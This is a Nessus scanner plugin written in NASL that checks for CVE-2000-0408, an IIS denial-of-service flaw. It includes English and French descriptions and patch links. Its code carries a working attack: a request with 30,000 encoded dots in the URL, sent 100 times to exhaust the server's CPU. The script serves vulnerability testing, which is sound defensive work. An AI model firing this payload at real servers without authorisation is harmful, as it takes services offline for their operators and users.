#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# Original code : USSR Lab (www.ussrback.com)
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10406);
 script_bugtraq_id(1190);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0408");
 name["english"] = "IIS Malformed Extension Data in URL";
 name["francais"] = "IIS Malformed Extension Data in URL";


 script_name(english:name["english"],
	     francais:name["francais"]);
 
 # Description
 desc["english"] = "
It was possible to make IIS use 100% of the CPU by
sending it malformed extension data in the URL
requested, preventing him to serve web pages
to legitimate clients.

Solution : Microsoft has made patches available at :
 - For Internet Information Server 4.0:
   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=20906
 - For Internet Information Server 5.0:
   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=20904

Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de forcer IIS a utiliser 100%
du CPU en lui envoyant des requetes ayant des
extensions mal formées, ce qui l'empeche de servir
des pages a des clients légitimes.

Solution : Microsoft a fait des patchs, disponibles à :
 - Pour Internet Information Server 4.0:

   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=20906
 - Pour Internet Information Server 5.0:
   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=20904

Facteur de risque : Sérieux";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);

 # Summary
 summary["english"] = "Performs a denial of service against IIS";
 summary["francais"] = "Provoque un déni de service contre un serveur IIS";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);

 # Category
 script_category(ACT_DENIAL);	# ACT_FLOOD?

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 
 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
else {
	sig = get_http_banner(port:port);
	if ( sig && ! egrep(pattern:"^Server:.*IIS", string:sig) ) exit(0);
     }


if(get_port_state(port))
{
 
 if(http_is_dead(port:port))exit(0);

 file = "/%69%6E%64%78" + crap(data:"%2E", length:30000) + "%73%74%6D";
 a = http_get(item:file, port:port);

 for(i=0;i<100;i=i+1)
 {
  s = http_open_socket(port);
  if ( ! s ) break;
  send(socket:s, data:a);
  http_close_socket(s);
 }


 if(http_is_dead(port:port))security_hole(port);
}

